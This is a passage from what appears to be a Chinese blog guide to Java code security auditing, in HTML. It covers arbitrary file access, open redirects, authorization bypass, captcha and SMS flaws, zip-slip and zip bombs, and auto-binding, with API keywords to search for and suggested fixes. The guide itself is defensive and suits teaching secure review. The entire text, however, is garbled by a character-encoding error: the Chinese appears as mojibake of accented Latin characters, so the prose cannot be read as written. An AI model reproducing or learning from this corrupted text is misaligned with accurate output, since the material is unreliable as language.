¡éªŒä¸å½“çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥ç»•è¿‡é™åˆ¶å¯¹æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶è¿›è¡Œæ“ä½œã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-7"><a href="#å®¡è®¡ç­–ç•¥-7" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>é¦–å…ˆå…³æ³¨åŒ…å«è¿™äº›åŠŸèƒ½çš„ç±»å’Œå‡½æ•°ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.ch</span><span class="hljs-selector-class">.FileChannelImpl</span><br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>.list/listFiles<br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileInputStream</span><br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileOutputStream</span><br>java<span class="hljs-selector-class">.io</span>.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem<br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.fs</span>.UnixFileSystemProvider/WindowsFileSystemProvider<br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.RandomAccessFile</span><br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.fs</span><span class="hljs-selector-class">.CopyFile</span><br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.fs</span><span class="hljs-selector-class">.UnixChannelFactory</span><br>sun<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.fs</span><span class="hljs-selector-class">.WindowsChannelFactory</span><br>java<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.channels</span><span class="hljs-selector-class">.AsynchronousFileChannel</span><br>FileUtil/IOUtil<br>filePath/download/deleteFile/move/getFile<br></code></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨è¿™äº›å‡½æ•°æ—¶ï¼Œå¯¹äºç”¨æˆ·ä¼ é€’æ¥çš„æ–‡ä»¶å¯¹è±¡&#x2F;æ–‡ä»¶å&#x2F;æ–‡ä»¶è·¯å¾„ï¼Œæ˜¯å¦è¿›è¡Œäº†æ­£ç¡®çš„å¤„ç†ï¼š</p><ul><li>æ˜¯å¦é™åˆ¶äº†å¯æ“ä½œæ–‡ä»¶çš„è·¯å¾„ã€æ–‡ä»¶ç±»å‹ã€æ–‡ä»¶æ‰€æœ‰è€…ã€‚</li><li>æ˜¯å¦å°†æ•æ„Ÿæ–‡ä»¶è¿›è¡Œæ’é™¤ã€‚</li><li>æŸ¥æ‰¾<code>getPath()</code>, <code>getAbsolutePath()</code>ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰é”™è¯¯çš„è·¯å¾„åˆ¤æ–­ã€‚</li></ul><p>å†æ’æŸ¥ç¨‹åºçš„å®‰å…¨ç­–ç•¥é…ç½®æ–‡ä»¶ï¼Œå…¨å±€æœç´¢<code>permission</code>ã€<code>Java.io.FilePermission</code>ã€<code>grant</code>å­—æ ·ã€‚æŸ¥çœ‹æ˜¯å¦åªä¸ºç¨‹åºçš„æŸéƒ¨åˆ†è·¯å¾„èµ‹äºˆè¯»å†™æƒé™ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-7"><a href="#å¦‚ä½•ä¿®å¤-7" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><ul><li>å¯¹è¦æ“ä½œçš„æ–‡ä»¶åè¿›è¡Œé»‘ç™½åå•é™åˆ¶ã€‚</li><li>å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œè¿‡æ»¤æ‰â€.&#x2F;â€œã€â€â€¦&#x2F;â€œã€â€%â€ã€â€&#x2F;â€œ</li><li>é’ˆå¯¹ä¸åŒçš„åŠŸèƒ½ï¼Œå°†å¯æ“ä½œæ–‡ä»¶è·¯å¾„é™åˆ¶åœ¨æŸä¸ªç›®å½•å†…ï¼Œç¦æ­¢æ”»å‡»è€…é€šè¿‡ â€˜..&#x2F;â€˜çš„æ–¹å¼ç©¿è¶Šè·¯å¾„ï¼Œå»ºè®®ä½¿ç”¨<code>getCanonicalPath()</code>æ ‡å‡†åŒ–è·¯å¾„ï¼Œä¹‹åå†è¿›è¡Œé™åˆ¶å’Œåˆ¤æ–­ã€‚</li><li>ä½¿ç”¨ FilePermission é™åˆ¶æƒé™ã€‚</li></ul><h4 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h4><h5 id="æ¼æ´æˆå› -8"><a href="#æ¼æ´æˆå› -8" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>ç”±äºWebç«™ç‚¹æœ‰æ—¶éœ€è¦æ ¹æ®ä¸åŒçš„é€»è¾‘å°†ç”¨æˆ·å¼•å‘åˆ°ä¸åŒçš„é¡µé¢ï¼Œå¦‚å…¸å‹çš„ç™»å½•æ¥å£å°±ç»å¸¸éœ€è¦åœ¨è®¤è¯æˆåŠŸä¹‹åå°†ç”¨æˆ·å¼•å¯¼åˆ°ç™»å½•ä¹‹å‰çš„é¡µé¢ï¼Œæ•´ä¸ªè¿‡ç¨‹ä¸­å¦‚æœå®ç°ä¸å¥½å°±å¯èƒ½å¯¼è‡´URLé‡å®šå‘é—®é¢˜ï¼Œæ”»å‡»è€…æ„é€ æ¶æ„è·³è½¬çš„é“¾æ¥ï¼Œå¯ä»¥å‘ç”¨æˆ·å‘èµ·é’“é±¼æ”»å‡»ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-8"><a href="#å®¡è®¡ç­–ç•¥-8" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>å‡ºç°URLé‡å®šå‘ä¸»è¦çš„åŠŸèƒ½æœ‰ï¼š</p><ul><li>ç”¨æˆ·ç™»å½•ã€ç»Ÿä¸€èº«ä»½è®¤è¯å¤„ï¼Œè®¤è¯å®Œäº†ä¼šé€šè¿‡url&#x3D;çš„å½¢å¼è·³è½¬åˆ°ç±»ä¼¼æ“ä½œçš„é¡µé¢ã€‚</li><li>ç”¨æˆ·åˆ†äº«ã€æ”¶è—å†…å®¹åè·³è½¬ã€‚</li><li>è·¨åŸŸè®¤è¯æˆæƒåè¿›è¡Œè·³è½¬ã€‚</li></ul><p>ä¸€äº›ç›¸å…³å‡½æ•°åŠå…³é”®å­—ï¼š<code>sendRedirect</code>ã€<code>setHeader</code>ã€<code>forward</code>ã€<code>redirect:</code>ã€<code>&lt;c:redirect</code>ã€<code>self.location.href</code>ã€<code>location.href</code>ã€<code>windows.location.href</code>ç­‰ã€‚<br>ä¸€äº›å¸¸è§çš„å‚æ•°åç§°ï¼š<code>redirect</code>ã€<code>redirect_do</code>ã€<code>redirect_url</code>ã€<code>url</code>ã€<code>jump</code>ã€<code>jump_to</code>ã€<code>target</code>ã€<code>to</code>ã€<code>link</code>ã€<code>domain</code>ç­‰ã€‚</p><p>å®¡è®¡çš„æ€è·¯ä¸ºå®šä½å¯èƒ½å­˜åœ¨redirectä¸šåŠ¡çš„ä»£ç æ®µï¼Œå®¡è®¡è·³è½¬çš„URLæ˜¯å¦æ¥è‡ªäºå‰ç«¯å‚æ•°ï¼Œæ˜¯å¦å…·æœ‰æ ¡éªŒå’Œé™åˆ¶ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-8"><a href="#å¦‚ä½•ä¿®å¤-8" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>å¯¹ä¼ å…¥çš„URLåšè®¤è¯å¤„ç†ï¼Œä¿è¯è¯¥URLæ¥è‡ªäºä¿¡ä»»åŸŸã€‚ä¾‹å¦‚å¦‚ä¸‹æ–¹å¼ï¼š</p><ul><li>é€šè¿‡é™åˆ¶Refererä¿è¯å°†è¦è·³è½¬URLçš„æœ‰æ•ˆæ€§ï¼Œé¿å…æ”»å‡»è€…ç”Ÿæˆè‡ªå·±çš„æ¶æ„è·³è½¬é“¾æ¥ã€‚</li><li>åŠ å…¥æœ‰æ•ˆæ€§éªŒè¯Tokenï¼Œä¿è¯æ‰€æœ‰ç”Ÿæˆçš„é“¾æ¥éƒ½æ¥è‡ªäºå¯ä¿¡åŸŸï¼Œé€šè¿‡åœ¨ç”Ÿæˆçš„é“¾æ¥é‡ŒåŠ å…¥ç”¨æˆ·ä¸å¯æ§çš„Tokenå¯¹ç”Ÿæˆçš„é“¾æ¥è¿›è¡Œæ ¡éªŒã€‚</li></ul><p>å…³é”®å‚æ•°å‰ç«¯ä¸å¯æ§ã€‚<br>å¯¹è·³è½¬çš„URLè¿›è¡Œç™½åå•æ£€æŸ¥</p><h3 id="ä¸šåŠ¡é€»è¾‘æ¼æ´"><a href="#ä¸šåŠ¡é€»è¾‘æ¼æ´" class="headerlink" title="ä¸šåŠ¡é€»è¾‘æ¼æ´"></a>ä¸šåŠ¡é€»è¾‘æ¼æ´</h3><h4 id="è¶Šæƒæ¼æ´"><a href="#è¶Šæƒæ¼æ´" class="headerlink" title="è¶Šæƒæ¼æ´"></a>è¶Šæƒæ¼æ´</h4><h5 id="æ¼æ´æˆå› -9"><a href="#æ¼æ´æˆå› -9" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><ul><li>åœ¨åº”ç”¨ç¨‹åºå¤„ç†å½“å‰ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·æƒé™è¿›è¡Œæ ¡éªŒï¼Œæˆ–æ ¡éªŒä¸è¶³ã€å¤±æ•ˆï¼Œå¯¼è‡´ä½æƒé™ç”¨æˆ·ä½¿ç”¨é«˜æƒé™åŠŸèƒ½ï¼Œæˆ–åŒæƒé™ç”¨æˆ·æ“ä½œå¯¹æ–¹æ•°æ®ã€‚</li><li>å¯¹ç”¨æˆ·çš„èº«ä»½æ ‡è¯†ä¿¡æ¯ä»å¯ä¼ªé€ çš„å‚æ•°æˆ–headersä¸­è·å–ï¼Œè€Œä¸æ˜¯ä»sessionä¸­è·å–çš„è¯ï¼Œå¯èƒ½å­˜åœ¨è¶Šæƒã€‚</li><li>ä¸€äº›è·¨åŸŸçš„æœåŠ¡å¯¼å‘æ¶æ„ï¼Œå°¤å…¶æ˜¯ä¸€äº›æ•°æ®å¤„ç†çš„æ¥å£ï¼Œå¦‚æœç¼ºå°‘ç±»ä¼¼tokençš„è®¤è¯æœºåˆ¶çš„è¯ï¼Œä¹Ÿä¼šå­˜åœ¨ç±»ä¼¼çš„è¶Šæƒè®¿é—®é—®é¢˜ã€‚</li></ul><h5 id="å®¡è®¡ç­–ç•¥-9"><a href="#å®¡è®¡ç­–ç•¥-9" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>é’ˆå¯¹ç³»ç»Ÿä»»æ„åŠŸèƒ½éƒ½å¯èƒ½å­˜åœ¨è¶Šæƒï¼Œå®¡è®¡å…³æ³¨çš„æ˜¯:</p><ul><li>æ“ä½œæ˜¯å¦éœ€è¦èº«ä»½æ ‡è¯†æˆ–å…¶ä»–æ ‡è¯†ã€‚</li><li>æ­¤æ ‡è¯†æ˜¯å¦ç”±ç”¨æˆ·å¯æ§ã€‚</li><li>æ˜¯å¦èƒ½å¤Ÿå¯çŒœè§£ï¼Œä¸åŒä¸»ä½“çš„æ ‡è¯†æ˜¯å¦å…·æœ‰è§„å¾‹æ€§ã€‚</li><li>æŸ¥è¯¢ä¿¡æ¯åœºæ™¯ä¸‹ï¼Œä¿¡æ¯æ˜¯å¦ä¸èº«ä»½æ ‡è¯†è¿›è¡Œç»‘å®šã€‚</li><li>å¯¹åº”å¤„ç†çš„å‡½æ•°æ–¹æ³•ä¸­æ˜¯å¦ä½¿ç”¨æ³¨è§£æˆ–å…¶ä»–æ–¹å¼å¯¹å½“å‰ç”¨æˆ·è¿›è¡Œæƒé™æ ¡éªŒã€‚</li><li>æ ¡éªŒèƒ½å¦è¢«ç»•è¿‡æˆ–å¤±æ•ˆã€‚</li></ul><h5 id="å¦‚ä½•ä¿®å¤-9"><a href="#å¦‚ä½•ä¿®å¤-9" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><ul><li>å¤„ç†è¯·æ±‚ä¹‹å‰å…ˆè¿›è¡Œæƒé™æ ¡éªŒï¼Œå¯é€šè¿‡Filterã€AOPæˆ–æ‹¦æˆªå™¨è¿›è¡Œå®ç°ã€‚</li><li>ç”¨æˆ·æ ‡è¯†ä»ç¼“å­˜ä¸­å–å‡ºï¼Œå°½é‡ä¸ä»å‚æ•°ä¸­å–ã€‚</li></ul><h4 id="å›¾å½¢éªŒè¯ç æ¼æ´"><a href="#å›¾å½¢éªŒè¯ç æ¼æ´" class="headerlink" title="å›¾å½¢éªŒè¯ç æ¼æ´"></a>å›¾å½¢éªŒè¯ç æ¼æ´</h4><h5 id="æ¼æ´æˆå› -10"><a href="#æ¼æ´æˆå› -10" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><ul><li>å½“éªŒè¯ç å›¾ç‰‡çš„é•¿å®½ç”±å‰ç«¯å‚æ•°æ§åˆ¶ï¼Œå¹¶ä¸”åç«¯æ²¡æœ‰è¿›è¡Œæ ¡éªŒæ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å¹¶å‘ç”Ÿæˆè¶…å¤§çš„å›¾ç‰‡æ¥è¿›è¡ŒDDOSæ”»å‡»ã€‚</li><li>å½“éªŒè¯ç è®¤è¯äº†ä¸€æ¬¡åï¼Œæ— è®ºæˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œæ²¡æœ‰åŠæ—¶æ¸…ç©ºï¼Œå°±å¯ä»¥è¢«é‡å¤ä½¿ç”¨ï¼Œå¯¼è‡´çˆ†ç ´æ”»å‡»ã€‚</li><li>ç®€å•çš„å›¾ç‰‡éªŒè¯ç å¯è¢«OCRè¯†åˆ«ï¼Œå¯¼è‡´çˆ†ç ´æ”»å‡»ã€‚</li><li>åœ¨åç«¯é€»è¾‘æ ¡éªŒè¿‡ç¨‹ä¸­å¹¶æœªå¯¹å‰ç«¯ä¼ é€’éªŒè¯ç å‚æ•°ä¸ºnullè¿›è¡Œç›¸å…³çš„é€»è¾‘åˆ¤æ–­ï¼Œç›´æ¥åˆ é™¤éªŒè¯ç å‚æ•°æˆ–ç½®ç©ºå€¼å³å¯ç»•è¿‡ã€‚</li></ul><h5 id="å®¡è®¡ç­–ç•¥-10"><a href="#å®¡è®¡ç­–ç•¥-10" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>åœ¨ç™»é™†ï¼Œé‡è¦æ•°æ®çš„å¢åˆ æ”¹åŠŸèƒ½å¤„ä¸€èˆ¬ä¼šæ·»åŠ å›¾å½¢éªŒè¯ç åŠŸèƒ½ï¼Œå¯ä»¥é€šå…³å…³é”®å­—æœç´¢ï¼š<code>captcha</code>ã€<code>checkCode</code>ç­‰ç­‰ã€‚<br>é‡ç‚¹å®¡è®¡éªŒè¯ç ç”Ÿæˆé€»è¾‘ï¼Œä»¥åŠéªŒè¯ç çš„åˆ¤æ–­æ ¡éªŒé€»è¾‘ã€é¡ºåºã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-10"><a href="#å¦‚ä½•ä¿®å¤-10" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>å›¾å½¢éªŒè¯ç ç”±åç«¯æ§åˆ¶å¤§å°ï¼›éªŒè¯ä¸€æ¬¡åæ— è®ºæ˜¯å¦æˆåŠŸéƒ½ç«‹å³æ¸…ç©ºç¼“å­˜ï¼›ç”Ÿæˆå¤æ‚çš„å›¾å½¢éªŒè¯ç ï¼Œé™ä½é­åˆ°æœºå™¨è¯†åˆ«çš„é£é™©ï¼›å¯¹éªŒè¯ç å‚æ•°æ˜¯å¦ä¸ºç©ºè¿›è¡Œåˆ¤æ–­ã€‚</p><h4 id="çŸ­ä¿¡æœåŠ¡æ¼æ´"><a href="#çŸ­ä¿¡æœåŠ¡æ¼æ´" class="headerlink" title="çŸ­ä¿¡æœåŠ¡æ¼æ´"></a>çŸ­ä¿¡æœåŠ¡æ¼æ´</h4><h5 id="æ¼æ´æˆå› -11"><a href="#æ¼æ´æˆå› -11" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><ul><li>å¦‚æœåº”ç”¨ç¨‹åºå¯¹çŸ­ä¿¡æ¥å£æ²¡æœ‰å‘é€é¢‘ç‡é™åˆ¶ã€æˆ–æ ¡éªŒé€»è¾‘æœ‰è¯¯ï¼Œåˆ™ä¼šå¯¼è‡´çŸ­ä¿¡ç‚¸å¼¹æ¼æ´ã€‚</li><li>å¦‚æœå¯¹æ‰‹æœºå·è¿›è¡Œæ ¡éªŒæˆ–æ ¼å¼åŒ–å¤„ç†é€»è¾‘æœ‰è¯¯ï¼Œå¯å¯¼è‡´æ”»å‡»è€…é€šè¿‡ä½¿ç”¨ç©ºæ ¼ã€åˆ†éš”ç¬¦ã€æ‰‹æœºåŒºå·ã€å­—æ¯ç­‰æ–¹å¼ç»•è¿‡å¯¹æ‰‹æœºå·çš„é™åˆ¶ï¼Œåœ¨è¿›è¡Œç¼“å­˜è®¡æ•°æ—¶è¿›è¡Œç»•è¿‡ã€‚</li><li>å¦‚æœçŸ­ä¿¡å†…å®¹çš„æç¤ºæœ‰éƒ¨åˆ†é€šè¿‡å‚æ•°å†…å®¹è·å–ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ”»å‡»è€…ç¯¡æ”¹æ¶ˆæ¯å†…å®¹ï¼Œå¯¹éƒ¨åˆ†ç”¨æˆ·è¿›è¡Œå®šç‚¹é’“é±¼æ”»å‡»ã€æˆ–åƒåœ¾çŸ­ä¿¡ç­‰ã€‚</li></ul><h5 id="å®¡è®¡ç­–ç•¥-11"><a href="#å®¡è®¡ç­–ç•¥-11" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>é‡ç‚¹å®¡è®¡å‘é€çŸ­ä¿¡éªŒè¯ç åŠŸèƒ½çš„ä¸šåŠ¡é€»è¾‘ï¼Œä¸€èˆ¬é€šè¿‡å…³é”®å­—<code>sms</code>è¿›è¡Œæœç´¢ã€‚å®¡è®¡ä¸šåŠ¡é€»è¾‘ã€ç¼“å­˜æ¬¡æ•°é€»è¾‘ã€éç©ºåˆ¤æ–­é€»è¾‘ã€çŸ­ä¿¡å†…å®¹é€»è¾‘ç­‰ç­‰ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-11"><a href="#å¦‚ä½•ä¿®å¤-11" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>é’ˆå¯¹æ‰‹æœºå·çš„æ ¼å¼åŒ–ä»¥åŠå·ç ç¼“å­˜çš„ä¸šåŠ¡é€»è¾‘è®¾è®¡ä¸€å®šè¦æ­£ç¡®ï¼Œå¯¹çŸ­ä¿¡å‘é€æ¥å£åŠéªŒè¯æ¥å£çš„ä¸šåŠ¡é¡ºåºè¦æ­£ç¡®ã€‚</p><h4 id="Zipæ–‡ä»¶æå–"><a href="#Zipæ–‡ä»¶æå–" class="headerlink" title="Zipæ–‡ä»¶æå–"></a>Zipæ–‡ä»¶æå–</h4><h5 id="æ¼æ´æˆå› -12"><a href="#æ¼æ´æˆå› -12" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>åœ¨ä¸šåŠ¡ä¸­å¯èƒ½å­˜åœ¨ä¸Šä¼ å‹ç¼©æ–‡ä»¶å¹¶æå–çš„åŠŸèƒ½ï¼Œåˆ©ç”¨æ­¤ç±»åŠŸèƒ½å¯èƒ½å­˜åœ¨å¦‚ä¸‹å®‰å…¨é—®é¢˜ï¼š</p><ul><li>å¦‚æœæå–å‡ºçš„æ–‡ä»¶æ ‡å‡†è·¯å¾„è½åœ¨è§£å‹çš„ç›®æ ‡ç›®å½•ä¹‹å¤–ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤åŠŸèƒ½è¿›è¡Œä»»æ„æ–‡ä»¶å†™å…¥ã€‚</li><li>æå–å‡ºçš„æ–‡ä»¶æ¶ˆè€—è¿‡å¤šçš„ç³»ç»Ÿèµ„æºã€‚zipç®—æ³•çš„æœ¬æ€§å°±å¯èƒ½ä¼šå¯¼è‡´zipç‚¸å¼¹ï¼ˆzip bombï¼‰çš„å‡ºç°ï¼Œ<br>ç”±äºæé«˜çš„å‹ç¼©ç‡ï¼Œå³ä½¿åœ¨è§£å‹å°æ–‡ä»¶æ—¶ï¼Œæ¯”å¦‚ZIPã€GIFï¼Œä»¥åŠgzipç¼–ç çš„HTTPå†…å®¹ï¼Œä¹Ÿ<br>å¯èƒ½ä¼šå¯¼è‡´è¿‡åº¦çš„èµ„æºæ¶ˆè€—ã€‚</li></ul><h5 id="å®¡è®¡ç­–ç•¥-12"><a href="#å®¡è®¡ç­–ç•¥-12" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>å®¡è®¡é‡ç‚¹ä¸»è¦å…³æ³¨åº”ç”¨æ˜¯å¦å­˜åœ¨ZIPè§£å‹ç¼©åŠŸèƒ½ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">FileInputStream<br>ZipInputStream<br><span class="hljs-function"><span class="hljs-title">getSize</span><span class="hljs-params">()</span></span><br>ZipEntry<br></code></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°getSizeåŸºæœ¬ä¸Šå°±éœ€è¦ç‰¹åˆ«æ³¨æ„äº†ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-12"><a href="#å¦‚ä½•ä¿®å¤-12" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>é’ˆå¯¹ZIPè§£å‹ç¼©åŠŸèƒ½ï¼Œåº”è¯¥åœ¨è§£å‹æ¯ä¸ªæ¡ç›®ä¹‹å‰å¯¹å…¶æ–‡ä»¶åè¿›è¡Œæ ¡éªŒã€‚å¦‚æœæ ¡éªŒä¸é€šè¿‡ï¼Œå°±ç»ˆæ­¢æ•´ä¸ªè§£å‹è¿‡ç¨‹ï¼Œæˆ–å¯¹å…¶è¿›è¡Œå¿½ç•¥ã€‚<br>é™¤äº†æ ¡éªŒæ–‡ä»¶åï¼Œè¿˜åº”è¯¥å¯¹æ¯ä¸ªæ–‡ä»¶å¤§å°è¿›è¡Œé™åˆ¶ï¼Œè¿‡å¤§çš„å•ä¸ªæ–‡ä»¶åº”è¯¥ä¸äºˆå¤„ç†ï¼Œæˆ–æŠ›å‡ºå¼‚å¸¸ã€‚<br>æœ€åå¯¹æ–‡ä»¶æ€»ä¸ªæ•°ä¹Ÿåº”è¯¥æœ‰æ‰€é™åˆ¶ï¼Œé¿å…è¿‡å¤šçš„æ–‡ä»¶æ•°ç›®å¯¼è‡´å ç”¨ç³»ç»Ÿèµ„æºã€‚</p><h4 id="è‡ªåŠ¨ç»‘å®šæ¼æ´"><a href="#è‡ªåŠ¨ç»‘å®šæ¼æ´" class="headerlink" title="è‡ªåŠ¨ç»‘å®šæ¼æ´"></a>è‡ªåŠ¨ç»‘å®šæ¼æ´</h4><h5 id="æ¼æ´æˆå› -13"><a href="#æ¼æ´æˆå› -13" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>æ”»å‡»è€…å¯èƒ½å°†éé¢„æœŸçš„HTTPè¯·æ±‚å‚æ•°ç»‘å®šåˆ°ä¸€ä¸ªå¯¹è±¡ä¸Šï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•æ¥åˆ›å»ºã€ä¿®æ”¹ã€æ›´æ–°å¼€å‘äººå‘˜æˆ–è€…ä¸šåŠ¡æœ¬èº«ä»æœªæ‰“ç®—å˜æ›´çš„å‚æ•°ï¼Œè€Œè¿™äº›æ–°å‚æ•°åè¿‡æ¥åˆä¼šå½±å“ç¨‹åºä»£ç ä¸­ä¸éœ€è¦çš„æ–°å˜é‡æˆ–å¯¹è±¡ï¼Œè¿›è€Œè§¦å‘ä¸€äº›ä¸šåŠ¡é€»è¾‘æ¼æ´ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-13"><a href="#å®¡è®¡ç­–ç•¥-13" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>é‡ç‚¹å®¡è®¡åº”ç”¨ç¨‹åºæ¥å‚æ—¶æ˜¯å¦ä½¿ç”¨è‡ªåŠ¨ç»‘å®šæ³¨å…¥å®Œæ•´å¯¹è±¡ï¼Œè€Œå¯¹è±¡æ˜¯å¦åˆå¯¹åº”äº†æ•°æ®å±‚çš„å®ä½“ç±»ï¼Œåœ¨æ›´æ–°æ•°æ®æ—¶æ˜¯å¦èƒ½å¤Ÿé€šè¿‡æ·»åŠ å‚æ•°çš„æ–¹å¼æ›´æ–°éé¢„æœŸçš„å±æ€§å€¼ï¼›æˆ–è¿™äº›å‚æ•°èƒ½å¦å½±å“åç»­ä¸šåŠ¡é€»è¾‘ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-13"><a href="#å¦‚ä½•ä¿®å¤-13" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>å–åŸå§‹æ•°æ®ç”±DAOå±‚å–ï¼›å­˜æ”¾äºsessionä¸­çš„å¯¹è±¡ï¼Œå¦‚ç”¨æˆ·ç­‰ï¼Œåœ¨æ›´æ–°ä¿¡æ¯æ—¶æ³¨æ„æ•æ„Ÿå­—æ®µï¼›ä½¿ç”¨è‡ªåŠ¨ç»‘å®šä»¥å®ä½“ç±»æ¥æ¥å‚æ—¶ï¼Œç¡®ä¿ç±»å±æ€§ä¸å®é™…å‚æ•°èƒ½å¤Ÿä¸€ä¸€å¯¹åº”ã€‚</p><h4 id="å…¶ä»–ä¸šåŠ¡é€»è¾‘æ¼æ´"><a href="#å…¶ä»–ä¸šåŠ¡é€»è¾‘æ¼æ´" class="headerlink" title="å…¶ä»–ä¸šåŠ¡é€»è¾‘æ¼æ´"></a>å…¶ä»–ä¸šåŠ¡é€»è¾‘æ¼æ´</h4><h5 id="æ¼æ´æˆå› -14"><a href="#æ¼æ´æˆå› -14" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>åœ¨ä»£ç ä¸­å¯èƒ½å­˜åœ¨å„ç§ä¸šåŠ¡é€»è¾‘ç±»çš„æ¼æ´ï¼Œè¦å…·ä½“çœ‹å¼€å‘äººå‘˜å®ç°çš„ä»£ç é€»è¾‘ã€‚åœ¨å®ç°æœ‰è¯¯çš„æƒ…å†µä¸‹ï¼Œå¦‚æ ¡éªŒä¸å®Œå…¨ã€æ ¡éªŒé¡ºåºé”™è¯¯ã€æ ¡éªŒé€»è¾‘è®¾è®¡é”™è¯¯ç­‰ï¼Œå°†ä¼šäº§ç”Ÿå„ç§ä¸šåŠ¡é€»è¾‘æ¼æ´ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-14"><a href="#å®¡è®¡ç­–ç•¥-14" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>æœ€å¸¸è§çš„å°±æ˜¯ä»»æ„å¯†ç é‡ç½®ã€éªŒè¯ç ç»•è¿‡ç­‰ç­‰ï¼Œä¸‹é¢ç®€å•åˆ—ä¸¾äº†ä¸€äº›ã€‚</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>. ç”¨æˆ·ç™»é™†ã€ç”¨æˆ·æ³¨å†Œã€æ‰¾å›å¯†ç ç­‰åŠŸèƒ½ä¸­å¯†ç ä¿¡æ¯æœªé‡‡ç”¨åŠ å¯†ç®—æ³•ã€‚<br><span class="hljs-number">2</span>. ç”¨æˆ·ç™»é™†ã€ç”¨æˆ·æ³¨å†Œã€æ‰¾å›å¯†ç ç­‰åŠŸèƒ½ä¸­`æœªé‡‡ç”¨éªŒè¯ç `æˆ–`éªŒè¯ç æœªåšå®‰å…¨åˆ·æ–°`(æœªåˆ·æ–°Sessionä¸­éªŒè¯ç çš„å€¼)å¯¼è‡´çš„æ’åº“ã€å¯†ç çˆ†ç ´æ¼æ´ã€‚<br><span class="hljs-number">3</span>. æ‰¾å›å¯†ç 